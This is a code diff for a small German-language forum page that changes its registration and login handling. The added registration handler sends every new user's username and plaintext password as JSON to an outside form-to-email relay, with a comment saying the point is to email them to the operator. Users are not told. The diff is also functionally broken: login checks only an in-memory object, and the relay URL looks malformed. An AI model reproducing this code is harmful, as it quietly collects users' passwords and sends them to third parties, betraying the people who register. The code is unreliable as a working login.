@@ -131,15 +131,17 @@ body {
 
 <div class="auth" id="auth">
   <h2>Forum</h2>
-  <input type="text" id="username" placeholder="Benutzername">
-  <input type="password" id="password" placeholder="Passwort">
-  <button onclick="register()">Registrieren</button>
+  <form id="registerForm">
+    <input type="text" name="username" placeholder="Benutzername" required>
+    <input type="password" name="password" placeholder="Passwort" required>
+    <button type="submit">Registrieren</button>
+  </form>
   <button onclick="login()">Login</button>
 </div>
 
 <div class="app" id="app" style="display:none;">
   <div class="chat">
-    <h2>Forum</h2>
+    <h2>Forum für Diskussionen</h2>
     <div class="messages" id="messages"></div>
     <div class="input-area">
       <input type="text" id="messageInput" placeholder="Nachricht schreiben...">
@@ -149,27 +151,34 @@ body {
 </div>
 
 <script>
-// Aufräumen alter Daten
-localStorage.removeItem('messages');
-localStorage.removeItem('users');
-
 let currentUser = null;
+let users = {};
 
-function register() {
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-  if(!username || !password) return alert('Bitte ausfüllen');
+// Registrierung mit Form Submit
+document.getElementById('registerForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const formData = new FormData(this);
+  const username = formData.get('username');
+  const password = formData.get('password');
 
-  let users = {};
+  if(!username || !password) return alert('Bitte alles ausfüllen');
+
   users[username] = password;
-  localStorage.setItem('users', JSON.stringify(users));
-  alert('Registriert! Jetzt einloggen.');
-}
+
+  // E-Mail an dich senden (Server muss eingerichtet sein)
+  fetch('https://formsubmit.co/https://4daf931137d05624f3efbfeaffda08d8', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username, password })
+  }).then(res => {
+    if(res.ok) alert('Registrierung erfolgreich!');
+    else alert('Fehler beim Senden der E-Mail.');
+  });
+});
 
 function login(){
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-  let users = JSON.parse(localStorage.getItem('users') || '{}');
+  const username = document.querySelector('#registerForm input[name=username]').value;
+  const password = document.querySelector('#registerForm input[name=password]').value;
   if(users[username] === password){
     currentUser = username;
     document.getElementById('auth').style.display='none';
